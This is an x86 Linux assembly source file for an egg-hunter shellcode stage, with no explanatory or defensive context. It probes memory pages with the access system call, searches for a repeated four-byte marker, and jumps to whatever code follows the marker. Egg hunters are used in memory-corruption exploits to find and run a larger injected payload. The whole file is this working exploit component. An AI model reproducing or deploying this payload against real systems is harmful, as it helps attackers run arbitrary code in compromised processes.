; Egg - 0xF890F990
 
global _start
 
        section .text
 
_start:
        xor edx, edx
 
allignpage:
        or dx, 0xfff
 
nextaddr:
        inc edx
        lea ebx, [edx+0x4]
        push byte 0x21    ; system call for access(2)
        pop eax
        int 0x80
 
        cmp al, 0xf2        ; checking for EFAULT
        je allignpage       ; going back to page allignment
        mov eax, 0xF890F990 ; egg
        mov edi, edx
        scasd
        jne nextaddr
        scasd
        jne nextaddr
        jmp edi
